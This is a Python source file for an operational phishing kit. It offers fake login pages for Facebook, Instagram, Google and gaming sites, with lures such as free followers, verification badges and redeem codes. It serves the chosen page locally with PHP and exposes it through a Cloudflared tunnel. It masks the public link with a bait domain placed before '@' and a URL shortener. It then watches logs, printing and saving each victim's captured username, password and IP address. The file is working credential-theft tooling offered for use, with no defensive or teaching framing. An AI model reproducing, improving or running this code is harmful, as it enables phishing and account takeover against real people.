import os
import shutil
import subprocess
import time
import sys

HOST = "127.0.0.1"
PORT = 8080
WEB_ROOT = ".server/www"
USER_LOG = os.path.join(WEB_ROOT, "usernames.txt")
IP_LOG = os.path.join(WEB_ROOT, "ip.txt")
CLD_LOG = ".cld.log"

# Color codes
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
C = "\033[1;36m"
W = "\033[0m"

ALL_SITES = {
    "Facebook": {
        "Traditional Login": "facebook",
        "Advanced Voting Page": "fb_advanced",
        "Fake Security Page": "fb_security",
        "Messenger Page": "fb_messenger"
    },
    "Instagram": {
        "Traditional Login": "instagram",
        "Auto Follower": "ig_followers",
        "1000 Followers": "insta_followers",
        "Blue Badge Verify": "ig_verify"
    },
    "Google": {
        "Old Login Page": "google",
        "New Login Page": "google_new",
        "Poll Style Page": "google_poll"
    },
    "PUBG": {
        "PUBG Event Page": "pubg"
    },
    "Free Fire": {
        "FF Redeem Code": "FFreward",
        "FF Lucky Event": "FFlucky",
        "FF Tournament": "FFall"
    },
    "Other": {
        "Love Calculator": "lover",
        "TN Result": "result"
    }
}

import requests

def clean():
    os.system("killall cloudflared")

def url_checker(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        raise ValueError("Invalid URL. Please use http or https.")

import requests
from urllib.parse import urlparse

def maskphish(phishing_url, bait_words="sample.com"):
    try:
        url_checker(phishing_url)

        print("\n[+] Shortening phishing URL using Ulvis...")

        payload = {
            "url": phishing_url,
            "custom": "",
            "password": "",
            "uses": "",
            "expire": "",
            "is_private": "false",
            "via": "web"
        }

        res = requests.post("https://ulvis.net/API/write/post", data=payload)
        data = res.json()

        if not data.get("success") or not data.get("data", {}).get("url"):
            raise ValueError("Failed to shorten URL: " + data.get("message", "Unknown error"))

        short_url = data["data"]["url"]
        shorter = short_url.replace("https://", "").replace("http://", "")

        if " " in bait_words:
            print("[!] Invalid bait words. Spaces are not allowed. Using fallback domain.")
            bait_words = ""

        if bait_words:
            final = f" https://{bait_words}@{shorter}"
        else:
            masking_domain = urlparse(phishing_url).netloc
            final = f"https://{masking_domain}@{shorter}"

        print(f"\n[+] Masked URL:{G}{final}{W}\n")
        return final

    except ValueError as ve:
        print(f"[!] {ve}")
    except Exception as e:
        print(f"[!] Error: {e}")

def choose_site():
    print(f"\n{Y}[+] Select a site category:{W}\n")
    categories = list(ALL_SITES.keys())
    for i, cat in enumerate(categories, 1):
        print(f"{C}{i}.{W} {cat}")
    try:
        choice = int(input(f"\n{Y}[~] Choose category: {W}")) - 1
        selected = categories[choice]
    except:
        print(f"{R}[-] Invalid selection.{W}")
        sys.exit()

    options = list(ALL_SITES[selected].items())
    print(f"\n{Y}[+] {selected} options:{W}")
    for i, (desc, _) in enumerate(options, 1):
        print(f"{C}{i}.{W} {desc}")
    try:
        opt = int(input(f"\n{Y}[~] Choose option: {W}")) - 1
        return options[opt][1]
    except:
        print(f"{R}[-] Invalid option.{W}")
        sys.exit()

def setup_site(site_folder):
    shutil.rmtree(WEB_ROOT, ignore_errors=True)
    os.makedirs(WEB_ROOT, exist_ok=True)
    shutil.copytree(f".sites/{site_folder}", WEB_ROOT, dirs_exist_ok=True)
    shutil.copy(".sites/ip.php", WEB_ROOT)
    print(f"{G}[✓] Copied {site_folder} to server directory.{W}")

def start_php_server():
    # Clean old logs
    if os.path.exists(CLD_LOG):
        os.remove(CLD_LOG)
    print(f"{Y}[~] Starting PHP server...{W}")
    subprocess.Popen(["php", "-S", f"{HOST}:{PORT}"], cwd=WEB_ROOT, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

import re

import re

def start_cloudflared():
    print(f"{Y}[~] Starting Cloudflared tunnel...{W}")
    subprocess.Popen([
        "cloudflared", "tunnel",
        "--url", f"http://{HOST}:{PORT}",
        "--logfile", CLD_LOG
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"{Y}[~] Waiting for Cloudflared link...{W}")
    time.sleep(4)

    link = None
    for _ in range(12):
        if os.path.exists(CLD_LOG):
            with open(CLD_LOG) as f:
                content = f.read()
                match = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', content)
                if match:
                    link = match.group(0)
                    break
        time.sleep(1)

    if not link:
        print(f"{R}[-] Failed to retrieve Cloudflared link.{W}")
        return None

    print(f"\n{G}[✓] Cloudflared URL:{W} {C}{link}{W}")

    mask_choice = input(f"\n{Y}[?] Do you want to mask the link? (y/n): {W}").strip().lower()
    if mask_choice == "y":
        bait = input(f"{Y}[~] Enter bait words (no spaces, use - if needed): {W}").strip()
        maskphish(link, bait)
    return link



def watch_logs():
    print(f"\n{Y}[~] Watching for victim interaction...{W}")
    while True:
        try:
            if os.path.exists(IP_LOG):
               with open(IP_LOG) as f:
                  lines = f.readlines()
                  for line in lines:
                    if "IP:" in line:
                       ip = line.split("IP:")[1].strip()
                       #print(f"{C}[IP]{W} {ip}")
               with open("ip.txt", "a") as out:
                  out.writelines(lines)
                  try:
                     os.remove(IP_LOG)
                  except FileNotFoundError:
                     pass  # Already removed or doesn't exist, ignore it

            if os.path.exists(USER_LOG):
                with open(USER_LOG) as f:
                    for line in f:
                        if "Username:" in line:
                            user = line.split("Username:")[1].strip()
                            print(f"{C}[Username]{W} {user}")
                        if "Pass:" in line:
                            pw = line.split("Pass:")[1].strip()
                            print(f"{C}[Password]{W} {pw}")
                with open("usernames.dat", "a") as out:
                    out.write(open(USER_LOG).read())
                os.remove(USER_LOG)

            time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{R}[!] Script terminated by user.{W}")
            break

def main():
    clean()
    os.makedirs(".server", exist_ok=True)
    site = choose_site()
    setup_site(site)
    start_php_server()
    start_cloudflared()
    watch_logs()

if __name__ == "__main__":
    main()
